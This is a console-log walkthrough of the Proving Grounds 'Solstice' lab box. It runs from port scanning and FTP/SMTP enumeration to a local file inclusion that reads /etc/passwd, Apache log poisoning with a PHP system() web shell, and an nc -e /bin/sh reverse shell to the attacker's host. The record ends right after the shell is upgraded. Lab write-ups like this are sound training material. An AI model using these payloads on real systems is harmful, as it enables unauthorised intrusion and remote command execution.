# Recon

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nmap -Pn -sT -sV -n 192.168.215.72 -p- --max-retries 2 --min-rate 1000
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-05 11:08 CST
Warning: 192.168.215.72 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.215.72
Host is up (0.095s latency).
Not shown: 62753 closed ports, 2774 filtered ports
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        pyftpdlib 1.5.6
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp       Exim smtpd
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
2121/tcp  open  ftp        pyftpdlib 1.5.6
3128/tcp  open  http-proxy Squid http proxy 4.6
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.15 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nmap -Pn -sT -sV -sC -n 192.168.215.72 -p 21,22,25,80,2121,3128,8593,54787
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-05 11:12 CST
Nmap scan report for 192.168.215.72
Host is up (0.092s latency).

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.215.72:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp    open  smtp       Exim smtpd
| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.215], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2121/tcp  open  ftp        pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.215.72:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp  open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.69 seconds
```


## FTP TCP/21

```console
root@kali:/OSCPv3/offsec_pg/Solstice# ftp 192.168.215.72
Connected to 192.168.215.72.
220 pyftpdlib 1.5.6 ready.
Name (192.168.215.72:root): anonymous
331 Username ok, send password.
Password:
530 Anonymous access not allowed.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## FTP TCP/2121

```console
root@kali:/OSCPv3/offsec_pg/Solstice# ftp 192.168.215.72 2121
Connected to 192.168.215.72.
220 pyftpdlib 1.5.6 ready.
Name (192.168.215.72:root): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> binary
200 Type set to: Binary.
ftp> ls
227 Entering passive mode (192,168,215,72,228,219).
125 Data connection already open. Transfer starting.
drws------   2 www-data www-data     4096 Jun 18  2020 pub
226 Transfer complete.
ftp> cd pub
250 "/pub" is the current directory.
ftp> ls
227 Entering passive mode (192,168,215,72,145,75).
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp> put test.txt
local: test.txt remote: test.txt
227 Entering passive mode (192,168,215,72,194,59).
550 Not enough privileges.
ftp> 
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# searchsploit pyftpdlib
Exploits: No Results
Shellcodes: No Results
Papers: No Results
``` 



## SMTP TCP/25

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc -vn 192.168.215.72 25
(UNKNOWN) [192.168.215.72] 25 (smtp) open
HELO
554 SMTP synchronization error
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nmap -p25 --script smtp-commands 192.168.215.72
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-05 11:26 CST
Nmap scan report for 192.168.215.72
Host is up (0.099s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: solstice Hello nmap.scanme.org [192.168.49.215], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 

Nmap done: 1 IP address (1 host up) scanned in 14.52 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc -vn 192.168.215.72 25
(UNKNOWN) [192.168.215.72] 25 (smtp) open
220 solstice ESMTP Exim 4.92 Fri, 05 Nov 2021 13:27:30 -0400
EHLO all      
250-solstice Hello all [192.168.49.215]
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-CHUNKING
250-PRDR
250 HELP
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc -vn 192.168.215.72 25
(UNKNOWN) [192.168.215.72] 25 (smtp) open
220 solstice ESMTP Exim 4.92 Fri, 05 Nov 2021 13:34:33 -0400
HELO x
250 solstice Hello x [192.168.49.215]
MAIL FROM:test@test.org
250 OK
RCPT TO:test
501 test: recipient address must contain a domain
RCPT TO:admin
501 admin: recipient address must contain a domain
RCPT TO:ed
501 ed: recipient address must contain a domain
RCPT TO:admin@solstice.com
550 relay not permitted
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc -vn 192.168.215.72 25
(UNKNOWN) [192.168.215.72] 25 (smtp) open
220 solstice ESMTP Exim 4.92 Fri, 05 Nov 2021 13:56:14 -0400
HELO x
250 solstice Hello x [192.168.49.215]
EXPN root
550 Administrative prohibition
EXPN sshd
550 Administrative prohibition
EXPN testt
550 Administrative prohibition
```

http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

```console
smtp-user-enum -M VRFY -U users.txt -t 192.168.215.72
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Fri Nov  5 11:58:10 2021 #########
######## Scan completed at Fri Nov  5 11:58:15 2021 #########
0 results.

1 queries in 5 seconds (0.2 queries / sec)
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# smtp-user-enum -M EXPN -u root -t 192.168.215.72
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... EXPN
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Fri Nov  5 11:59:27 2021 #########
######## Scan completed at Fri Nov  5 11:59:32 2021 #########
0 results.

1 queries in 5 seconds (0.2 queries / sec)
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# smtp-user-enum -M RCPT  -u root -t 192.168.215.72
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Fri Nov  5 12:00:03 2021 #########
######## Scan completed at Fri Nov  5 12:00:08 2021 #########
0 results.

1 queries in 5 seconds (0.2 queries / sec)
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nmap --script smtp-enum-users 192.168.215.72 -p 25
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-05 12:01 CST
Nmap scan report for 192.168.215.72
Host is up (0.14s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Couldn't find any accounts

Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```


```console
root@kali:/OSCPv3/offsec_pg/Solstice# searchsploit Exim
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Dovecot with Exim - 'sender_address' Remote Command Execution                                                 | linux/remote/25297.txt
Exim - 'GHOST' glibc gethostbyname Buffer Overflow (Metasploit)                                               | linux/remote/36421.rb
Exim - 'perl_startup' Local Privilege Escalation (Metasploit)                                                 | linux/local/39702.rb
Exim - 'sender_address' Remote Code Execution                                                                 | linux/remote/25970.py
Exim 3.x - Format String                                                                                      | linux/local/20900.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                 | linux/local/40054.c
Exim 4.41 - 'dns_build_reverse' Local Buffer Overflow                                                         | linux/local/756.c
Exim 4.41 - 'dns_build_reverse' Local Read Emails                                                             | linux/local/1009.c
Exim 4.42 - Local Privilege Escalation                                                                        | linux/local/796.sh
Exim 4.43 - 'auth_spa_server()' Remote                                                                        | linux/remote/812.c
Exim 4.63 - Remote Command Execution                                                                          | linux/remote/15725.pl
Exim 4.84-3 - Local Privilege Escalation                                                                      | linux/local/39535.sh
Exim 4.87 - 4.91 - Local Privilege Escalation                                                                 | linux/local/46996.sh
Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit)                                                    | linux/local/47307.rb
Exim 4.87 < 4.91 - (Local / Remote) Command Execution                                                         | linux/remote/46974.txt
Exim 4.89 - 'BDAT' Denial of Service                                                                          | multiple/dos/43184.txt
exim 4.90 - Remote Code Execution                                                                             | linux/remote/45671.py
Exim < 4.86.2 - Local Privilege Escalation                                                                    | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution                                                               | linux/remote/44571.py
Exim Buffer 1.6.2/1.6.51 - Local Overflow                                                                     | unix/local/20333.c
Exim ESMTP 4.80 - glibc gethostbyname Denial of Service                                                       | linux/dos/35951.py
Exim Internet Mailer 3.35/3.36/4.10 - Format String                                                           | linux/local/22066.c
Exim Sender 3.35 - Verification Remote Stack Buffer Overrun                                                   | linux/remote/24093.c
Exim4 < 4.69 - string_format Function Heap Buffer Overflow (Metasploit)                                       | linux/remote/16925.rb
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                      | php/webapps/42221.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```


## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Solstice/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nmap -Pn -sT -sV --script http-enum -n 192.168.215.72 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-05 11:40 CST
Nmap scan report for 192.168.215.72
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# python3 /opt/dirsearch/dirsearch.py -u http://192.168.215.72 -e txt,php,cgi,sh -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: txt, php, cgi, sh | HTTP method: get | Threads: 10 | Wordlist size: 7209

Error Log: /opt/dirsearch/logs/errors-21-11-05_11-41-35.log

Target: http://192.168.215.72

[11:41:35] Starting: 
[11:42:05] 301 -  314B  - /app  ->  http://192.168.215.72/app/
[11:42:07] 301 -  317B  - /backup  ->  http://192.168.215.72/backup/
[11:42:26] 200 -  296B  - /index.html
[11:42:27] 301 -  321B  - /javascript  ->  http://192.168.215.72/javascript/

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# python3 /opt/dirsearch/dirsearch.py -u http://192.168.215.72 -e txt,php,cgi,sh -x 403 -w /usr/share/dirb/wordlists/big.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: txt, php, cgi, sh | HTTP method: get | Threads: 10 | Wordlist size: 20469

Error Log: /opt/dirsearch/logs/errors-21-11-05_11-45-36.log

Target: http://192.168.215.72

[11:45:37] Starting: 
[11:46:06] 301 -  314B  - /app  ->  http://192.168.215.72/app/
[11:46:13] 301 -  317B  - /backup  ->  http://192.168.215.72/backup/
[11:47:37] 301 -  321B  - /javascript  ->  http://192.168.215.72/javascript/

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# python3 /opt/dirsearch/dirsearch.py -u http://192.168.215.72 -e txt,php,cgi,sh -x 403 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: txt, php, cgi, sh | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-21-11-05_11-55-03.log

Target: http://192.168.215.72

[11:55:04] Starting: 
[11:55:04] 200 -  296B  - /
[11:55:14] 301 -  314B  - /app  ->  http://192.168.215.72/app/
[11:55:16] 301 -  321B  - /javascript  ->  http://192.168.215.72/javascript/
[11:55:22] 301 -  317B  - /backup  ->  http://192.168.215.72/backup/

Task Completed
``` 



## HTTP Proxy TCP/3128

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl -kv -x http://192.168.215.72:3128 http://192.168.215.72
*   Trying 192.168.215.72:3128...
* TCP_NODELAY set
* Connected to 192.168.215.72 (192.168.215.72) port 3128 (#0)
> GET http://192.168.215.72/ HTTP/1.1
> Host: 192.168.215.72
> User-Agent: curl/7.68.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Server: squid/4.6
< Mime-Version: 1.0
< Date: Fri, 05 Nov 2021 19:02:04 GMT
< Content-Type: text/html;charset=utf-8
< Content-Length: 3513
< X-Squid-Error: ERR_ACCESS_DENIED 0
< Vary: Accept-Language
< Content-Language: en
< X-Cache: MISS from localhost
< X-Cache-Lookup: NONE from localhost:3128
< Via: 1.1 localhost (squid/4.6)
< Connection: keep-alive
....
.....
```

## HTTP TCP/8593, TCP/54787

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Solstice/img/3.png)

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.215.72:8593
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p></p>    </body>
</html>
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Solstice/img/4.png)

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.215.72:8593/index.php?book=list
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p></p>    </body>
</html>
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Solstice# wfuzz -c -t 500 --hc=404 --hh=376 -w /opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt http://192.168.215.72:8593/index.php?book=FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.215.72:8593/index.php?book=FUZZ
Total requests: 569

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000068:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../proc/self/environ"
000066:  C=200     12 L	      32 W	    470 Ch	  "../../../../proc/self/environ"
000067:  C=200     12 L	      32 W	    470 Ch	  "../../../../../proc/self/environ"
000051:  C=200     48 L	      94 W	   2444 Ch	  "../../../../etc/passwd"
000052:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../etc/passwd"
000053:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../etc/passwd"
000054:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../etc/passwd"
000055:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../etc/passwd"
000056:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../etc/passwd"
000057:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../etc/passwd"
000058:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../../etc/passwd"
000059:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../../../etc/passwd"
000060:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../../../../etc/passwd"
000061:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../../../../../etc/passwd"
000062:  C=200     48 L	      94 W	   2444 Ch	  "../../../../../../../../../../../../../../../../etc/passwd"
000075:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../proc/self/environ"
000076:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../../proc/self/environ"
000077:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../../../proc/self/environ"
000078:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../../../../proc/self/environ"
000079:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../../../../../proc/self/environ"
000080:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../../../../../../../proc/self/environ"
000069:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../proc/self/environ"
000070:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../proc/self/environ"
000071:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../proc/self/environ"
000072:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../proc/self/environ"
000073:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../proc/self/environ"
000074:  C=200     12 L	      32 W	    470 Ch	  "../../../../../../../../../../../../proc/self/environ"
000394:  C=200     79 L	      99 W	   1280 Ch	  "../../../../etc/group"
000395:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../etc/group"
000396:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../etc/group"
000397:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../etc/group"
000398:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../etc/group"
000399:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../etc/group"
000400:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../../etc/group"
000401:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../../../etc/group"
000402:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../../../../etc/group"
000403:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../../../../../etc/group"
000404:  C=200     79 L	      99 W	   1280 Ch	  "../../../../../../../../../../../../../../etc/group"
000470:  C=200     12 L	      32 W	    376 Ch	  "../../../../../../../../../../../../../../../var/log/apache/error_log%00"

Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received
``` 

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Solstice/img/5.png)

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.215.72:8593/index.php?book=../../../../etc/passwd
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
</p>    </body>
</html>
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.215.72:8593/index.php?book=../../../../etc/passwd | grep bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2444    0  2444    0     0  13502      0 --:--:-- --:--:-- --:--:-- 13502
We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
``` 

https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

http://192.168.163.72:8593/index.php?book=../../../../var/log/apache2/access.log

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc 192.168.135.72 80
GET <?php system($_GET['cmd']); ?> HTTP/1.0
HTTP/1.1 400 Bad Request
Date: Thu, 18 Nov 2021 15:07:53 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET / HTTP/1.1" 200 524 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:53 -0500] "GET  HTTP/1.0\n" 400 0 "-" "-"
</p>    </body>
</html>
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl --user-agent "<?php system($_GET['cmd']); ?>" http://192.168.135.72
 <head>
Currently configuring the database, try later.
 <style type ="text/css" >
   .footer{ 
       position: fixed;     
       text-align: center;    
       bottom: 0px; 
       width: 100%;
   }  
</style>
</head>
<body>
    <div class="footer">Proudly powered by phpIPAM 1.4</div>
</body>
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET / HTTP/1.1" 200 524 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:53 -0500] "GET  HTTP/1.0\n" 400 0 "-" "-"
192.168.49.135 - - [18/Nov/2021:10:09:30 -0500] "GET / HTTP/1.1" 200 548 "-" ""
</p>    </body>
</html>
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log\&cmd=whoami
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?book=list">Book List</a>
	</div>
We are still setting up the library! Try later on!<p>192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET / HTTP/1.1" 200 524 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:34 -0500] "GET /favicon.ico HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0"
192.168.49.135 - - [18/Nov/2021:10:07:53 -0500] "GET www-data
 HTTP/1.0\n" 400 0 "-" "-"
192.168.49.135 - - [18/Nov/2021:10:09:30 -0500] "GET / HTTP/1.1" 200 548 "-" ""
</p>    </body>
</html>
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Solstice/img/6.png)


```console
root@kali:/OSCPv3/offsec_pg/Solstice# curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log\&cmd=nc%20192.168.49.135%204444%20%2de%20/bin/sh
....
....
....
```

```console
root@kali:/OSCPv3/offsec_pg/Solstice# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.72] 46974
whoami
www-data
script /dev/null -c bash
Script started, file is /dev/null
www-data@solstice:/var/tmp/webserver$ ^Z
[1]+  Detenido                nc -lvnp 4444
root@kali:/OSCPv3/offsec_pg/Solstice# stty raw -echo
